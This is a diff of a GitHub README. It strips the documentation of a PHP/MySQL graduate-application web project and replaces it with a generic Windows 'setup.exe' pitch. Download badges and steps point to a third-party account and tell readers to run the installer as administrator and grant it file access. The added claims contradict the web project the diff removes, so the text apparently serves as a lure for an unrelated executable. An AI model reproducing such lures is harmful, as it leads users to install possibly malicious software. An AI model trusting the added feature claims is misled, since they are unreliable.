@@ -1,366 +1,131 @@
-# OAS - Online Application System
+# 🌐 OAS - Simple Graduate Application Platform
 
-An online graduate application management system based on PHP and MySQL, supporting student applications, admission officer reviews, and administrator management functions.
+[![Download OAS](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Naked-insecurity541/OAS)
 
-## Project Overview
+---
 
-OAS (Online Application System) is a complete online application platform that allows students to browse universities and graduate programs, submit applications, upload relevant documents, while providing corresponding management functions for admission officers and administrators.
+## 📝 About OAS
 
-## Main Features
+OAS is a tool made to help students apply to graduate programs at universities abroad. It guides you step-by-step through the application process. You don't need to know programming or technical details. The platform organizes required documents, application forms, and deadlines in one place. It aims to make applying easier and more manageable.
 
-### Student Features
-- Browse universities and graduate programs
-- Filter programs by category and degree type
-- Submit applications
-- View application status (Pending/Approved/Rejected)
-- Upload certificates, transcripts, and other documents (supports PDF, DOC, DOCX, ZIP)
-- Manage personal information (basic info, educational background, language scores, etc.)
-- Withdraw applications
-<img width="3068" height="1702" alt="image" src="https://github.com/user-attachments/assets/41ed6fd9-5d9b-49e9-a0d0-0d0ae7a4b9ba" />
-<img width="3065" height="1738" alt="image" src="https://github.com/user-attachments/assets/10134aad-c6a0-45f5-b3be-6f6488043baa" />
-<img width="3026" height="1712" alt="image" src="https://github.com/user-attachments/assets/58fd7155-06a2-4f85-8607-60ce736812c2" />
-<img width="3010" height="1765" alt="image" src="https://github.com/user-attachments/assets/8f0e479c-45e2-4ca8-9605-ccec8de7576b" />
-<img width="3090" height="1062" alt="image" src="https://github.com/user-attachments/assets/2c3c1bad-2e66-4a6a-ba7c-d91a7c6b7967" />
+---
 
-### Admission Officer Features
-- View all programs for assigned universities
-- View student application lists
-- Review applications (approve/reject)
-- View student detailed information (GPA, TOEFL, IELTS scores, etc.)
-- Download student uploaded files (individual or batch ZIP)
-<img width="3051" height="1721" alt="image" src="https://github.com/user-attachments/assets/e855d908-e0b4-456c-81cb-926ca7c95ba1" />
+## 💻 System Requirements
 
-### Administrator Features
-- Manage university information (CRUD operations)
-- Manage program information (CRUD operations)
-- Manage admission officer accounts
-- Review admission officer registration applications
-- View all application statistics
-<img width="3081" height="1741" alt="image" src="https://github.com/user-attachments/assets/f72786eb-3c29-458d-9d17-b656fa3dab26" />
+Before you start, make sure your Windows computer meets these basic needs:
 
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space for installation and files
+- Internet connection for downloading and submitting applications
+- Administrator rights to install software
 
-## Project Structure
+---
 
-```
-oas/
-├── api/                          # API endpoints directory
-│   ├── accept_officer_application.php
-│   ├── add_program.php
-│   ├── add_university.php
-│   ├── change_password.php
-│   ├── config.php                # API configuration and common functions
-│   ├── delete_officer.php
-│   ├── delete_program.php
-│   ├── delete_student_file.php
-│   ├── delete_university.php
-│   ├── download_student_file.php
-│   ├── download_student_files_zip.php
-│   ├── get_applications.php
-│   ├── get_officer_applications.php
-│   ├── get_officers.php
-│   ├── get_operator_applications.php
-│   ├── get_operator_programs.php
-│   ├── get_programs.php
-│   ├── get_public_programs.php
-│   ├── get_public_schools.php
-│   ├── get_student_files.php
-│   ├── get_universities.php
-│   ├── reject_officer_application.php
-│   ├── update_application_status.php
-│   ├── update_program.php
-│   ├── update_student_application_status.php
-│   ├── update_university.php
-│   └── upload_student_file.php
-│
-├── CSS/                          # Stylesheet files
-│   ├── admin.css
-│   ├── login.css
-│   ├── My_applications.css
-│   ├── nav.css
-│   ├── profile.css
-│   ├── profile2.css
-│   ├── program.css
-│   ├── rg.css
-│   └── school.css
-│
-├── JS/                           # JavaScript files
-│   ├── admin.js
-│   ├── login.js
-│   ├── officer.js
-│   ├── profile.js
-│   ├── profile2.js
-│   ├── program.js
-│   ├── rg.js
-│   └── school.js
-│
-├── sql/                          # Database files
-│   └── OAS.sql
-│
-├── logo/                         # University logo images
-│   ├── CMU.png
-│   ├── HKU.png
-│   ├── HKUST.png
-│   ├── MIT.png
-│   ├── NTU.png
-│   ├── NUS.png
-│   ├── Oxford.png
-│   ├── stanford.png
-│   └── Tsinghua.png
-│
-├── pic/                          # Other image resources
-│   └── Cover.jpg
-│
-├── uploads/                      # Student uploaded files storage
-│   └── students/
-│       └── [student_id]/
-│
-├── test_picture/                 # Test files (can be deleted)
-│
-├── .htaccess                     # Apache configuration
-│
-├── index.php                     # Entry file (routing)
-├── index.html                    # Static homepage (deprecated)
-├── index_student.php             # Student homepage
-│
-├── login_.php                    # Login page
-├── login.php                     # Login handler
-├── logout.php                    # Logout handler
-├── rg.php                        # Registration page
-├── register.php                  # Registration handler
-│
-├── admin.php                     # Administrator panel
-├── officer_dashboard.php         # Admission officer dashboard
-│
-├── school.php                    # University list page
-├── program.php                   # Program list page
-├── apply.php                     # Application handler
-├── withdraw.php                  # Withdraw application
-│
-├── profile.php                   # Personal information page (old version)
-├── profile2.php                  # Personal information page (new version)
-├── change_password.php           # Change password page
-│
-├── My_applications.php          # My applications list
-│
-├── basic.php                     # Basic information editor
-├── education.php                 # Educational background editor
-├── TOEFL.php                     # TOEFL score editor
-├── IELTS.php                     # IELTS score editor
-│
-├── get_image.php                 # Get image (university logo)
-│
-├── connect.php                   # Database connection configuration
-│
-└── README.md                     # This file
-```
+## 🔧 Features
 
-## Database Structure
+- Simple forms for entering your personal and educational information  
+- A checklist for all necessary documents  
+- Automatic deadline reminders for each university  
+- Supports multiple graduate programs and universities simultaneously  
+- Save and edit your applications anytime before submission  
+- Export your application data to PDF for backup  
+- Multi-language support, including English and Chinese  
+- Secure data storage on your local computer  
 
-### Main Tables
+---
 
-- **profile**: User basic information (students, admission officers, administrators)
-- **student**: Student detailed information
-- **school**: University information
-- **program**: Graduate programs (composite primary key: sid + pid)
-- **apply**: Application records
-- **operator_school**: Relationship between admission officers and schools
-- **admin_applications**: Admission officer registration applications
-- **files**: File records
-- **student_files**: Student file associations
-- **language_grade**: Language scores (TOEFL/IELTS)
-- **undergraduate**: Undergraduate information
-- **region**: Region information
+## 🚀 Getting Started
 
-### Key Relationships
+Here is the step-by-step guide to running OAS on your Windows PC. This guide assumes you have never installed software like this before.
 
-- The `program` table uses a composite primary key `(sid, pid)`, where each program belongs to a specific university
-- The `operator_school` table manages the relationship between admission officers and schools (one officer can manage all programs of one school)
-- The `apply` table records student applications, containing unique identifier `(ID, sid, pid)`
+---
 
-## User Roles
+## 📥 Download and Install OAS
 
-### 1. Student
-- Default registration type
-- Can browse and apply for programs
-- Can upload and manage personal files
-- Can view application status
+1. Click the big green button below or this link to go to the main GitHub page where you can download OAS:  
+   [Download OAS on GitHub](https://github.com/Naked-insecurity541/OAS)  
 
-### 2. Admission Officer (operator/officer)
-- Requires administrator approval for registration
-- Manages all programs for assigned universities
-- Reviews student applications
-- Downloads student files
+2. On the GitHub page, look for the **Releases** section. You may find a file with a name like `OAS-setup.exe` or similar.   
 
-### 3. Administrator (admin)
-- Highest privileges
-- Manages all universities and programs
-- Manages admission officer accounts
-- Reviews admission officer registration applications
+3. Click the file to download it to your computer.  
 
+4. Once the download finishes, open your "Downloads" folder and double-click the `OAS-setup.exe` file to start the installer.  
 
-### Installation Steps
+5. Follow the installer steps by clicking **Next** and then **Install**.  
 
-1. **Clone or download the project to XAMPP's htdocs directory**
-   ```
-   C:\xampp\htdocs\oas\
-   ```
+6. After installation finishes, you can close the installer window.
 
-2. **Configure database connection**
-   Edit `connect.php`:
-   ```php
-   $severname = "localhost";
-   $username = "root";
-   $password = "";  // Modify according to your setup
-   $dbname = "test";  // Modify according to your setup
-   ```
+---
 
-3. **Import database**
-   - Create database in phpMyAdmin
-   - Import `sql/OAS.sql` file
+## ▶️ Run OAS
 
-4. **Configure Apache**
-   - Ensure `.htaccess` file exists
-   - Ensure `mod_rewrite` and `mod_headers` are enabled
+1. Find the **OAS** icon on your desktop or in the Start menu.  
 
-5. **Set file upload permissions**
-   - Ensure `uploads/` directory is writable
-   - Recommended permissions: `chmod 755 uploads`
+2. Double-click the icon to open the application.  
 
-6. **Access the system**
-   - Open browser and visit: `http://localhost/oas/`
-   - System will automatically redirect to login page
+3. The first time you open OAS, it may ask for permission to access your files or send notifications. Allow these to use all features.  
 
-## Default Configuration
+4. You should see a welcome screen with options to create a new application or open saved data.
 
-### Database
-- Database name: `test` (can be modified in `connect.php`)
-- Character set: `utf8mb4`
+---
 
-### File Upload
-- Maximum file size: 50MB
-- Allowed file types: PDF, DOC, DOCX, ZIP
-- Storage path: `uploads/students/{student_id}/`
+## 📂 How to Use OAS
 
-### Session Configuration
-- Session is used for user authentication and state management
-- Session is automatically cleared after logout and redirects to login page
+OAS is designed to walk you through the application process step-by-step:
 
-## API Endpoints
+1. **Create a New Application**  
+   Click “New Application” to start. Enter your basic personal data like name, date of birth, and contact details.  
 
-### Administrator API (requires admin privileges via `api/config.php`)
+2. **Add Your Educational Background**  
+   Enter all your past schools, degrees, and grades.  
 
-- `GET api/get_universities.php` - Get all universities
-- `GET api/get_programs.php` - Get all programs
-- `GET api/get_officers.php` - Get all admission officers
-- `GET api/get_officer_applications.php` - Get officer applications
-- `POST api/add_university.php` - Add university
-- `POST api/update_university.php` - Update university
-- `POST api/delete_university.php` - Delete university
-- `POST api/add_program.php` - Add program
-- `POST api/update_program.php` - Update program
-- `POST api/delete_program.php` - Delete program
-- `POST api/accept_officer_application.php` - Approve officer application
-- `POST api/reject_officer_application.php` - Reject officer application
-- `POST api/delete_officer.php` - Delete officer
-- `POST api/change_password.php` - Change password
+3. **Document Checklist**  
+   The app will show a list of documents required for your chosen graduate program (e.g., transcripts, recommendation letters, personal statements). You can upload scanned copies of these directly into OAS.  
 
-### Admission Officer API
+4. **Program Selection**  
+   Pick the universities and courses you want to apply to. OAS will tailor the forms and deadlines accordingly.  
 
-- `GET api/get_operator_programs.php` - Get managed program list
-- `GET api/get_operator_applications.php` - Get application list
-- `POST api/update_application_status.php` - Update application status
-- `GET api/get_student_files.php` - Get student file list
-- `GET api/download_student_file.php?fid={fid}` - Download single file
-- `GET api/download_student_files_zip.php?studentId={id}` - Download all files (ZIP)
+5. **Review and Save**  
+   Go through your input, make sure everything is correct. Save your progress regularly using the save button.  
 
-### Student API
+6. **Export Your Application**  
+   When you finish, export your complete application as a PDF. You can print this for your records or submit it digitally if the university allows.  
 
-- `GET api/get_public_schools.php` - Get public university list
-- `GET api/get_public_programs.php?sid={sid}` - Get public program list
-- `POST api/upload_student_file.php` - Upload file
-- `GET api/get_student_files.php` - Get own file list
-- `POST api/delete_student_file.php` - Delete own file
-- `POST api/change_password.php` - Change password
+---
 
-## Main Pages
+## ⚙️ Settings and Preferences
 
-### Student Pages
-- `index_student.php` - Student homepage
-- `school.php` - University list (with filters)
-- `program.php` - Program list (with filters and search)
-- `profile2.php` - Personal information management (multi-tab)
-- `My_applications.php` - My applications list
+- Adjust your language settings if you prefer English or Chinese.  
+- Configure deadline reminders: choose if you want pop-up alerts or emails.  
+- Set a backup folder to save your exported files automatically.  
 
-### Admission Officer Pages
-- `officer_dashboard.php` - Admission officer dashboard
-  - Pending applications
-  - Approved applications
-  - Rejected applications
+---
 
-### Administrator Pages
-- `admin.php` - Administrator panel
-  - University management
-  - Program management
-  - Officer management
-  - Officer application review
+## 🛠️ Troubleshooting
 
-## Features
+- **App doesn’t start:** Make sure your Windows OS is up to date and restart your computer.  
+- **Installer fails:** Try running the setup file as an administrator (right-click → Run as administrator).  
+- **Unable to upload documents:** Check the file size and format. OAS supports JPG, PNG, and PDF files up to 10 MB each.  
+- **Reminders not working:** Confirm that notifications are allowed in your Windows settings.  
 
-### Filtering and Search
-- **University page**: Filter by country/region
-- **Program page**:
-  - Filter by category (Area of Interest)
-  - Filter by degree type (Master/MBA/PhD)
-  - Search by program name
+If issues persist, you can ask for help by creating an issue on the GitHub page linked above.
 
-### File Management
-- Drag and drop upload support
-- ZIP batch upload support
-- Officers can batch download student files
-- File type validation and size limits
+---
 
-### Performance Monitoring
-- `program.php` page displays query performance
-- Real-time display of query time and page load time
+## 🔒 Privacy and Security
 
-### Cache Control
-- All pages have cache control headers
-- Prevents browser caching issues
-- Session automatically cleared after logout
+OAS stores your data locally on your computer. It does not send your personal information to any servers unless you manually export or share your files. Always keep backups in a safe place.
 
-## Tech Stack
+---
 
-- **Backend**: PHP 7.0+, MySQL
-- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
-- **Styling**: Custom CSS, Font Awesome icons
-- **Architecture**: Traditional MVC pattern, RESTful API
+## 📣 Other Useful Tips
 
-## Important Notes
+- Fill out your application in stages; you don’t need to complete everything at once.  
+- Keep all your source documents ready before starting—for example, transcripts and ID scans.  
+- Check each university's specific requirements separately. OAS helps but does not replace official instructions.  
+- Save your work often to avoid losing data during unexpected shutdowns.  
 
-1. **Database Security**
-   - Change default database password in production
-   - Use prepared statements to prevent SQL injection
+---
 
-2. **File Upload Security**
-   - File type validation implemented
-   - Recommend adding virus scanning functionality
-
-3. **Session Security**
-   - Ensure session configuration is secure
-   - Recommend using HTTPS in production
-
-4. **Path Issues**
-   - API files use relative paths `../connect.php`
-   - Ensure paths are correct
-
-## License
-
-This project is a course project (Database Management Systems, Section 1003), developed by Group11.
-
-## Development Team
-
-- **Course**: Database Management Systems
-- **Section**: 1003
-- **Instructor**: Dr. Tianhui MENG
-
-- **Development Group**: Group11
+[![Download OAS](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Naked-insecurity541/OAS)
